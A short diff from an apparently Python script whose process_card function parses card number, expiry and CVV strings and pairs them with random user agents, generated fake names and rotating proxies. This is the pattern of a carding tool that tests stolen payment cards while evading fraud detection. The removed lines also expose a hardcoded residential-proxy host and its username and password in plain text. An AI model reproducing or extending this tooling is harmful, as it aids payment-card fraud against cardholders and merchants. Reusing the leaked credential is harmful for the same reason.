@@ -93,11 +93,7 @@ async def process_card(card: str) -> str:
             cc_number, mes, ano_number, cvv = card.split('|')
             if len(ano_number) == 2: ano_number = "20"+ano_number
             agente_user = UserAgent()
-            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
-            proxy = "geo.iproyal.com:12321"  # SIN "http://"
-            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"
-
-            proxys={"server": f"http://{proxy_host}:{proxy_port}"}
+            
 
             #============[Address Found]============#
             name  = usuario()['name'].split(' ')[0]
